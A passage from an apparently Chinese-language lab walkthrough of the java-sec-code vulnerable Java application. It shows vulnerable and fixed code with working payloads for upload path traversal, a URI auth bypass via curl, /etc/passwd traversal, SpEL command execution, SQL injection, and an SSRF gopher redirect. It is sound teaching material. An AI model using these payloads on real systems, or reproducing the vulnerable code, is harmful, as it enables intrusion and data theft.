class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        logger.info(filePath + &quot; delete failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.对文件名做了白名单限制{“.jpg”, “.png”, “.jpeg”, “.gif”, “bmp”, “.ico”} 只允许对这些文件进行上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String[] picSuffixList &#x3D; &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">boolean suffixFlag &#x3D; false;</span><br><span class="line">for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">    if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">        suffixFlag &#x3D; true;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!suffixFlag) &#123;</span><br><span class="line">    logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">    deleteFile(filePath);</span><br><span class="line">    return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2.判断MIME类型是否在黑名单内 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;text&#x2F;html&quot;,</span><br><span class="line">&quot;text&#x2F;javascript&quot;,</span><br><span class="line">&quot;application&#x2F;javascript&quot;,</span><br><span class="line">&quot;application&#x2F;ecmascript&quot;,</span><br><span class="line">&quot;text&#x2F;xml&quot;,</span><br><span class="line">&quot;application&#x2F;xml&quot;</span><br></pre></td></tr></table></figure>

<p>3.使用contains为了防止text/html;charset=UTF-8绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">    logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">    deleteFile(filePath);</span><br><span class="line">    return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.使用IsImage()函数调用ImageIO.read()函数来检测内容是否为文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static boolean isImage(File file) throws IOException &#123;</span><br><span class="line">    BufferedImage bi &#x3D; ImageIO.read(file);</span><br><span class="line">    return bi !&#x3D; null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5.上传文件时会通过uuid生成一个’/tmp’ + uuid + ‘png’ 这样的文件名，然后最后删除掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">        byte[] bytes &#x3D; multifile.getBytes();</span><br><span class="line">        Path path &#x3D; Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">    logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">    return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private void deleteFile(String filePath) &#123;</span><br><span class="line">    File delFile &#x3D; new File(filePath);</span><br><span class="line">    if(delFile.isFile() &amp;&amp; delFile.exists()) &#123;</span><br><span class="line">        if (delFile.delete()) &#123;</span><br><span class="line">            logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(filePath + &quot; delete failed!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084805243.png" alt="image-20211026084805243"></p>
<p>存在未对文件名做校验，存在路径穿越漏洞，参数修改为<code>../../Users/oldthree/Documents/0.OL4THREE/0.Base/apache-tomcat-8.5.70/webapps/java_sec_code_war/1.png</code> 我们可以上传图片到任意目录，上传图片马不解析</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026084911718.png" alt="image-20211026084911718"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">─ol4three ~&#x2F;Documents&#x2F;0.OL4THREE&#x2F;0.Base&#x2F;apache-tomcat-8.5.70&#x2F;webapps&#x2F;java_sec_code_war</span><br><span class="line">╰─$ ls</span><br><span class="line">1.png    META-INF WEB-INF</span><br></pre></td></tr></table></figure>

<p>直接进行访问即可</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026085048387.png" alt="image-20211026085048387"></p>
<p>由于会重新随机生成文件名未在检测中进行，导致上传jsp失败仍然会在/tmp目录下进行生成随机数生成的.jsp</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026092407832.png" alt="image-20211026092407832"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╭─ol4three &#x2F;tmp</span><br><span class="line">╰─$ ls</span><br><span class="line">06dc320d-35fb-11ec-937b-c91feee9eae9.jsp</span><br><span class="line">1989897e-35fb-11ec-937b-195f26ab9cc0.jsp</span><br><span class="line">2156c28f-35fb-11ec-937b-a71889553c3e.jsp</span><br></pre></td></tr></table></figure>

<p>使用文件上传any接口上传jsp文件解析利用如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091923728.png" alt="image-20211026091923728"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026091850244.png" alt="image-20211026091850244"></p>
<h2 id="10-GetRequestURI"><a href="#10-GetRequestURI" class="headerlink" title="10.GetRequestURI"></a>10.GetRequestURI</h2><blockquote>
<p>当应用存在静态资源目录，比如<code>/css/</code>目录，在权限校验时一般会选择放行，即不校验权限。研发同学用<code>getRequestURI()</code>获取URI后，判断是否包含 <code>/css/</code>字符串，如果包含则不校验权限。此时如果URI为<code>/css/../hello</code>，用<code>getRequestURI()</code>获取的URI是<code>/css/../hello</code>，包含<code>/css/</code>字符串，所以不校验权限。但是此时后端的路由为<code>/hello</code>，导致权限绕过。</p>
</blockquote>
<p>核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(value &#x3D; &quot;&#x2F;exclued&#x2F;vuln&quot;)</span><br><span class="line">public String exclued(HttpServletRequest request) &#123;</span><br><span class="line"></span><br><span class="line">    String[] excluedPath &#x3D; &#123;&quot;&#x2F;css&#x2F;**&quot;, &quot;&#x2F;js&#x2F;**&quot;&#125;;</span><br><span class="line">    String uri &#x3D; request.getRequestURI(); &#x2F;&#x2F; Security: request.getServletPath()</span><br><span class="line">    PathMatcher matcher &#x3D; new AntPathMatcher();</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;getRequestURI: &quot; + uri);</span><br><span class="line">    logger.info(&quot;getServletPath: &quot; + request.getServletPath());</span><br><span class="line"></span><br><span class="line">    for (String path : excluedPath) &#123;</span><br><span class="line">        if (matcher.match(path, uri)) &#123;</span><br><span class="line">            return &quot;You have bypassed the login page.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;This is a login page &gt;..&lt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到判断包含/css/和/js/字符串如果包含则不进行校验权限</p>
<p>由于作者写的时候是使用根目录检测需要/css/..;/exclued/vuln 开头，可以修改网站根目录进行测试或者，手动调试修改代码</p>
<p>使用curl进行验证发现可以成功绕过return “You have bypasswd the login page.” </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ curl -i -s -k  -X $&#39;GET&#39; \</span><br><span class="line">    -H $&#39;Upgrade-Insecure-Requests: 1&#39; -H $&#39;User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36&#39; -H $&#39;Referer: http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;login&#39; \</span><br><span class="line">    -b $&#39;JSESSIONID&#x3D;41B2022F0376956FF0E5583CEC92FD3B; XSRF-TOKEN&#x3D;7de740ac-305e-41b3-b711-438a1b068f77; remember-me&#x3D;YWRtaW46MTYzNjM2NzI0NjU0NDozNTYwZjNiODFiODBhOTYxOTcxZGM4YWQ2NDY5ZTExZA&#39; \</span><br><span class="line">    $&#39;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;uri&#x2F;css&#x2F;..;&#x2F;exclued&#x2F;vuln&#39;</span><br><span class="line">HTTP&#x2F;1.1 200</span><br><span class="line">X-Application-Context: application</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode&#x3D;block</span><br><span class="line">Cache-Control: no-cache, no-store, max-age&#x3D;0, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Expires: 0</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">Content-Type: text&#x2F;plain;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">You have bypassed the login page.%</span><br></pre></td></tr></table></figure>

<p>使用浏览器访问如下：<a href="http://172.20.10.6:8080/java_sec_code_war/uri/css/..;/exclued/vuln">http://172.20.10.6:8080/java_sec_code_war/uri/css/..;/exclued/vuln</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211025182934819.png" alt="image-20211025182934819"></p>
<p>安全的方法是使用：getServletPath()方法，该方法会自动对URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2021-10-25 18:28:11.268  INFO 2967 --- [nio-8080-exec-5] org.joychou.controller.GetRequestURI     : getRequestURI: &#x2F;css&#x2F;..;&#x2F;exclued&#x2F;vuln</span><br><span class="line">2021-10-25 18:28:11.268  INFO 2967 --- [nio-8080-exec-5] org.joychou.controller.GetRequestURI     : getServletPath: &#x2F;exclued&#x2F;vuln</span><br></pre></td></tr></table></figure>

<p>使用getServletPath()方法对URI进行标准化(normalize)，先对URI进行URLDecode，如果存在<code>/../</code>，将其返回到上一级目录，即/css/..;/exclued/vuln/处理为/exclued/vuln/，并将新的Path设置为servletPath。</p>
<h2 id="11-PathTraversal"><a href="#11-PathTraversal" class="headerlink" title="11.PathTraversal"></a>11.PathTraversal</h2><p>路径遍历攻击（也称为目录遍历）是指在访问储存在web根目录文件夹之外的文件和目录。通过操纵带有“点-斜线（..）”序列及其变化的文件或使用绝对文件路径来引用文件的变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置和关键系统文件。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;path_traversal&#x2F;vul?filepath&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;path_traversal&#x2F;vul&quot;)</span><br><span class="line">public String getImage(String filepath) throws IOException &#123;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    private String getImgBase64(String imgFile) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));</span><br><span class="line">    logger.info(&quot;File path: &quot; + imgFile);</span><br><span class="line"></span><br><span class="line">    File f &#x3D; new File(imgFile);</span><br><span class="line">    if (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line">        byte[] data &#x3D; Files.readAllBytes(Paths.get(imgFile));</span><br><span class="line">        return new String(Base64.encodeBase64(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;File doesn&#39;t exist or is not a file.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有对文件名做校验存在漏洞</p>
<p>访问<a href="http://172.20.10.6:8080/java_sec_code_war/path_traversal/vul?filepath=../../../../../../../../etc/passwd">http://172.20.10.6:8080/java_sec_code_war/path_traversal/vul?filepath=../../../../../../../../etc/passwd</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026094047542.png" alt="image-20211026094047542"></p>
<p>修复代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;path_traversal&#x2F;sec&quot;)</span><br><span class="line">public String getImageSec(String filepath) throws IOException &#123;</span><br><span class="line">    if (SecurityUtil.pathFilter(filepath) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        logger.info(&quot;Illegal file path: &quot; + filepath);</span><br><span class="line">        return &quot;Bad boy. Illegal file path.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用pathFilter对输入的路径进行过滤，跟进去查看pathFilter()函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String pathFilter(String filepath) &#123;</span><br><span class="line">    String temp &#x3D; filepath;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; use while to sovle multi urlencode</span><br><span class="line">    while (temp.indexOf(&#39;%&#39;) !&#x3D; -1) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            temp &#x3D; URLDecoder.decode(temp, &quot;utf-8&quot;);</span><br><span class="line">        &#125; catch (UnsupportedEncodingException e) &#123;</span><br><span class="line">            logger.info(&quot;Unsupported encoding exception: &quot; + filepath);</span><br><span class="line">            return null;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.info(e.toString());</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (temp.contains(&quot;..&quot;) || temp.charAt(0) &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return filepath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对输入的参数先做检测若是URL编码先做解码，然后检测对”..”,”/“参数做过滤。</p>
<h2 id="12-SpEL"><a href="#12-SpEL" class="headerlink" title="12.SpEL"></a>12.SpEL</h2><blockquote>
<p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p>
</blockquote>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;spel&#x2F;vuln&quot;)</span><br><span class="line">public String rce(String expression) &#123;</span><br><span class="line">    ExpressionParser parser &#x3D; new SpelExpressionParser();</span><br><span class="line">    &#x2F;&#x2F; fix method: SimpleEvaluationContext</span><br><span class="line">    return parser.parseExpression(expression).getValue().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接将用户的输入当作表达式内容进行解析。</p>
<p>输入一个简单的乘法运算<code>2*2</code>，可以看到返回的值是经过解析后的<code>4</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095240922.png" alt="image-20211026095240922"></p>
<p>执行下系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;spel&#x2F;vuln&#x2F;?expression&#x3D;T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095448592.png" alt="image-20211026095448592"></p>
<ol>
<li><a href="https://www.kingkk.com/2019/05/SPEL表达式注入-入门篇/">SPEL表达式注入-入门篇</a></li>
<li><a href="http://rui0.cn/archives/1043">由浅入深SpEL表达式注入漏洞</a></li>
</ol>
<h2 id="13-SQLI"><a href="#13-SQLI" class="headerlink" title="13.SQLI"></a>13.SQLI</h2><p>Sql注入修改mysql的配置之后即可进行，整体比较简单</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;jdbc&#x2F;vuln&quot;)</span><br><span class="line">public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection con &#x3D; DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        if (!con.isClosed())</span><br><span class="line">            System.out.println(&quot;Connect to database successfully.&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; sqli vuln code</span><br><span class="line">        Statement statement &#x3D; con.createStatement();</span><br><span class="line">        String sql &#x3D; &quot;select * from users where username &#x3D; &#39;&quot; + username + &quot;&#39;&quot;;</span><br><span class="line">        logger.info(sql);</span><br><span class="line">        ResultSet rs &#x3D; statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        while (rs.next()) &#123;</span><br><span class="line">            String res_name &#x3D; rs.getString(&quot;username&quot;);</span><br><span class="line">            String res_pwd &#x3D; rs.getString(&quot;password&quot;);</span><br><span class="line">            String info &#x3D; String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(&quot;Sorry,can&#96;t find the Driver!&quot;);</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    return result.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接对输入的username参数进行拼接存在sql注入漏洞</p>
<p>访问url：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;sqli&#x2F;mybatis&#x2F;vuln01?username&#x3D;joychou%27%20or%20%271%27&#x3D;%271</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026181809439.png" alt="image-20211026181809439"></p>
<p>控制台输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &#x3D;&#x3D;&gt;  Preparing: select * from users where username &#x3D; &#39;joychou&#39; or &#39;1&#39;&#x3D;&#39;1&#39; </span><br><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &#x3D;&#x3D;&gt; Parameters: </span><br><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &lt;&#x3D;&#x3D;      Total: 2</span><br></pre></td></tr></table></figure>



<p>修复代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;jdbc&#x2F;sec&quot;)</span><br><span class="line">public String jdbc_sqli_sec(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result &#x3D; new StringBuilder();</span><br><span class="line">    try &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection con &#x3D; DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        if (!con.isClosed())</span><br><span class="line">            System.out.println(&quot;Connecting to Database successfully.&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; fix code</span><br><span class="line">        String sql &#x3D; &quot;select * from users where username &#x3D; ?&quot;;</span><br><span class="line">        PreparedStatement st &#x3D; con.prepareStatement(sql);</span><br><span class="line">        st.setString(1, username);</span><br><span class="line"></span><br><span class="line">        logger.info(st.toString());  &#x2F;&#x2F; sql after prepare statement</span><br><span class="line">        ResultSet rs &#x3D; st.executeQuery();</span><br><span class="line"></span><br><span class="line">        while (rs.next()) &#123;</span><br><span class="line">            String res_name &#x3D; rs.getString(&quot;username&quot;);</span><br><span class="line">            String res_pwd &#x3D; rs.getString(&quot;password&quot;);</span><br><span class="line">            String info &#x3D; String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(&quot;Sorry, can&#96;t find the Driver!&quot;);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    return result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>prepareStatement()通过预处理方式进行修复</p>
<blockquote>
<p>预处理的修复原理：针对字符串类型的SQL注入，是在字符串两边加上一对单号哈<code>&#39;&#39;</code>，对于中间点的单引号对其进行转义<code>\&#39;</code>，让其变成字符的单引号。Mybatis的<code>#&#123;&#125;</code>也是预处理方式处理SQL注入。</p>
<p>在使用了mybatis框架后，需要进行排序功能时，在mapper.xml文件中编写SQL语句时，注意orderBy后的变量要使用<code>$&#123;&#125;</code>,而不用<code>#&#123;&#125;</code>。因为<code>#&#123;&#125;</code>变量是经过预编译的，<code>$&#123;&#125;</code>没有经过预编译。虽然<code>$&#123;&#125;</code>存在SQL注入的风险，但orderBy必须使用<code>$&#123;&#125;</code>，因为<code>#&#123;&#125;</code>会多出单引号<code>&#39;&#39;</code>导致SQL语句失效。为防止SQL注入只能自己对其过滤。</p>
</blockquote>
<p>根据下面的结果可以发现<code>order by &#39;username&#39;</code>并没有用，第一条SQL和第二条SQL效果一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users order by &#39;username&#39; desc -- 结果为 joychou wilson lightless </span><br><span class="line">select * from users                      -- 结果为 joychou wilson lightless </span><br><span class="line">select * from users order by username        -- 结果为 joychou lightless wilson</span><br><span class="line">select * from users order by username desc   -- 结果为 wilson lightless joychou</span><br></pre></td></tr></table></figure>

<h2 id="14-SSRF"><a href="#14-SSRF" class="headerlink" title="14.SSRF"></a>14.SSRF</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><blockquote>
<p>SSRF(Server-side Request Forge, 服务端请求伪造)。 由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
</blockquote>
<h3 id="2-支持协议"><a href="#2-支持协议" class="headerlink" title="2.支持协议"></a>2.支持协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc</span><br></pre></td></tr></table></figure>

<p>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</p>
<h3 id="3-重定向"><a href="#3-重定向" class="headerlink" title="3.重定向"></a>3.重定向</h3><p>Java默认会跟随重定向。先在一台服务器上写一个test.php，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; &#39;gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou&#39;;</span><br><span class="line">header(&quot;location: $url&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>启动apache 放置对应文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apachectl start</span><br><span class="line">cp ~&#x2F;Desktop&#x2F;test.php &#x2F;Library&#x2F;WebServer&#x2F;Documents</span><br></pre></td></tr></table></figure>

<p>访问payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php</span><br></pre></td></tr></table></figure>

<p>收到异常：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.net.MalformedURLException: unknown protocol: gopher</span><br></pre></td></tr></table></figure>

<p>跟踪报错代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private boolean followRedirect() throws IOException &#123;</span><br><span class="line">    if(!this.getInstanceFollowRedirects()) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        final int var1 &#x3D; this.getResponseCode();</span><br><span class="line">        if(var1 &gt;&#x3D; 300 &amp;&amp; var1 &lt;&#x3D; 307 &amp;&amp; var1 !&#x3D; 306 &amp;&amp; var1 !&#x3D; 304) &#123;</span><br><span class="line">            final String var2 &#x3D; this.getHeaderField(&quot;Location&quot;);</span><br><span class="line">            if(var2 &#x3D;&#x3D; null) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                URL var3;</span><br><span class="line">                try &#123;</span><br><span class="line">                    &#x2F;&#x2F; 该行代码发生异常，var2变量值为&#96;gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou&#96;</span><br><span class="line">                    var3 &#x3D; new URL(var2);</span><br><span class="line">                    &#x2F;* 该行代码，表示传入的协议必须和重定向的协议一致</span><br><span class="line">                     * 即http:&#x2F;&#x2F;joychou.me&#x2F;302.php的协议必须和gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou一致</span><br><span class="line">                     *&#x2F;</span><br><span class="line">                    if(!this.url.getProtocol().equalsIgnoreCase(var3.getProtocol())) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (MalformedURLException var8) &#123;</span><br><span class="line">                    var3 &#x3D; new URL(this.url, var2);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>从上面的followRedirect方法可以看到：</p>
<ul>
<li>实际跳转的URL也在限制的协议内</li>
<li>传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。</li>
</ul>
<p>所以，Java的SSRF利用方式比较局限：</p>
<ul>
<li>利用file协议任意文件读取</li>
<li>利用http协议探测端口或攻击内网服务</li>
</ul>
<h3 id="4-DNS-Rebinding"><a href="#4-DNS-Rebinding" class="headerlink" title="4.DNS Rebinding"></a>4.DNS Rebinding</h3><p>先了解下Java应用的TTL机制。Java应用的默认TTL为10s，这个默认配置会导致DNS Rebinding绕过失败。也就是说，默认情况下，Java应用不受DNS Rebinding影响。</p>
<p>Java TTL的值可以通过下面三种方式进行修改：</p>
<ol>
<li><p>JVM添加启动参数<code>-Dsun.net.inetaddr.ttl=0</code></p>
</li>
<li><p>通过代码进行修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改<code>java.security</code>里的<code>networkaddress.cache.negative.ttl</code>变量为0</p>
</li>
</ol>
<h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h3><ul>
<li>Java默认跟随重定向；</li>
<li>Java默认TTL为10；</li>
<li>是否受DNS Rebinding影响取决于缓存；</li>
<li>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</li>
<li>传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。</li>
</ul>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;urlConnection&#x2F;vuln&quot;, method &#x3D; &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="line">public String URLConnectionVuln(String url) &#123;</span><br><span class="line">    return HttpUtils.URLConnection(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进URLConnectiong(url)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String URLConnection(String url) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u &#x3D; new URL(url);</span><br><span class="line">        URLConnection urlConnection &#x3D; u.openConnection();</span><br><span class="line">        BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); &#x2F;&#x2F;send request</span><br><span class="line">        &#x2F;&#x2F; BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(u.openConnection().getInputStream()));</span><br><span class="line">        String inputLine;</span><br><span class="line">        StringBuilder html &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        while ((inputLine &#x3D; in.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            